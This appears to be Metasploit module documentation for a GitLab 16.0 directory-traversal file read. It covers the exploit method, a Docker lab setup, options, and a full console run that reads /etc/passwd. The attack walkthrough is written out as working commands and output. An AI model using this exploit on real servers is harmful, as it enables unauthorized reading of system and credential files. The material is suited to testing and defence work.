## Vulnerable Application

Gitlab version 16.0 contains a directory traversal for arbitrary file read as the gitlab user.
In order to exploit this vulnerability, a user must be able to create a project and groups.
When exploiting this vulnerability, a group (or subgroup under the group) must be created
for each level of the traversal. If the depth is 11 for the dir traversal, then a group
and 10 sub-groups will be created. Lastly a project is created for that subgroup.
With all these requirements satisfied a dummy file is uploaded, and the full
traversal is then executed. Cleanup is performed by deleting the first group which
cascades to deleting all other objects created.

Tested on Docker image of gitlab 16.0

### Install

A docker image is available:

```
sudo docker run --detach \
  --hostname gitlab.example.com \
  --publish 443:443 --publish 80:80 --publish 22:22 \
  --name gitlab \
  --restart always \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  --shm-size 256m \
gitlab/gitlab-ee:16.0.0-ee.0 
```

To retrieve the default password:

```
sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use [module path]`
1. Do: `run`
1. You should get a shell.

## Options

### DEPTH

Depth for Path Traversal (also groups creation), 11 seems pretty safe but it may work with less. Defaults to `11`

### FILE

File to read. Defaults to `/etc/passwd`

## Scenarios

### Docker Gitlab 16.0

```
msf6 > use auxiliary/scanner/http/gitlab_subgroups_file_read
[*] Using auxiliary/scanner/http/gitlab_subgroups_file_read
msf6 auxiliary(scanner/http/gitlab_subgroups_file_read) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 auxiliary(scanner/http/gitlab_subgroups_file_read) > set username root
username => root
msf6 auxiliary(scanner/http/gitlab_subgroups_file_read) > set password r6eh7UfeWsEKuK4cJJP+dJ79X4xwmNMOHN6mBKSyd2s=
password => r6eh7UfeWsEKuK4cJJP+dJ79X4xwmNMOHN6mBKSyd2s=
msf6 auxiliary(scanner/http/gitlab_subgroups_file_read) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/gitlab_subgroups_file_read) > exploit

[+] CSRF Token: wYYZ0Q1TnrrZmqwpAk707emZcXsIlzMawZ7s-HycVHmo668JVMqDb-R8NCVTVEMNlDAWbrIwngXKSH2wWtURzQ
[*] Creating 11 groups
[*] Creating group: OqJVwVlC with parent id: 
[+] CSRF Token: 8X7OT15TxpI36rOIu-ghgVbodK8fRl4Lz-3fqaNH_MmYE3iXB8rbRwoMK4Tq8pZhK0ETuqXh8xTEO07hhQ65fQ
[*] Creating group: 5hYTGpp8 with parent id: 2
[+] CSRF Token: PNnNU0R5iB-57xVW20dBD0FKfb1yMw15tjvHCZICyG9VtHuLHeCVyoQJjVqKXfbvPOMaqMiUoGa97VZBtEuN2w
[*] Creating group: XlpSkZKQ with parent id: 3
[+] CSRF Token: nS0eZJb7gVQM6-HYRPpj14MBhIq4WoObZOFASPC_F1b0QKi8z2KcgTENedQV4NQ3_qjjnwL9LoRvN9EA1vZS4g
[*] Creating group: KQCk8adK with parent id: 4
[+] CSRF Token: yr8EaL1nQdm9aIhpGca1Ay8u2m3oLGqAk_BO23hw02Sj0rKw5P5cDICOEGVI3ALjUoe9eFKLx5-YJt-TXjmW0A
[*] Creating group: xg9hUYPo with parent id: 5
[+] CSRF Token: 5wYo0n-rkMKFMRGlFyjN6knw71WIBDIUUjyLLDSE9UmOa54KJjKNF7jXialGMnoKNFmIQDKjnwtZ6hpkEs2w_Q
[*] Creating group: cNrX6LHf with parent id: 6
[+] CSRF Token: Z4IipgGhLQixQu8cbyNznk2pIj0udxMCgGKHaEzqkw4O75R-WDgw3YykdxA-OcR-MABFKJTQvh2LtBYgaqPWug
[*] Creating group: Mg4MESRy with parent id: 7
[+] CSRF Token: 4g209zNkQLg2Mf4RPMsSOjIGD-f2jaJrP_Fa4iYQRLaLYAIvav1dbQvXZh1t0aXaT69o8kwqD3Q0J8uqAFkBAg
[*] Creating group: 7b2cIgyZ with parent id: 8
[+] CSRF Token: MbKcsl5RuiynfU8JyJ1iT_mBKKqfAWpuM7LEVjTTmPBY3ypqB8in-Zqb1wWZh9WvhChPvyWmx3E4ZFUeEprdRA
[*] Creating group: EDkbB7Mw with parent id: 9
[+] CSRF Token: FbcBF0FcEy1vhn-ahOLHgz5wPx952kmwDNT2Qfte-Ud82rfPGMUO-FJg55bV-HBjQ9lYCsN95K8HAmcJ3Re88w
[*] Creating group: 4L2kbTKx with parent id: 10
[+] CSRF Token: iSsK-buEQzOnykZ_DmtRo2_4RV6HSix8nLEpDN9WeSjgRrwh4h1e5pos3nNfceZDElEiSz3tgWOXZ7hE-R88nA
[*] Creating group: UrW6NUYW with parent id: 11
[+] CSRF Token: _Md66xoUbGn3lOKAkgDR9p30KKPH6sDEBckrOfE8LNaVqswzQ41xvMpyeozDGmYW4F1Ptn1NbdsOH7px13VpYg
[*] Creating project 8tXCf26j
[*] Creating a dummy file in project
[*] Executing dir traversal
[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

[+] /etc/passwd saved to /root/.msf4/loot/20230529000533_default_127.0.0.1_Gitlabfile_212326.txt
[*] Deleting group OqJVwVlC
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
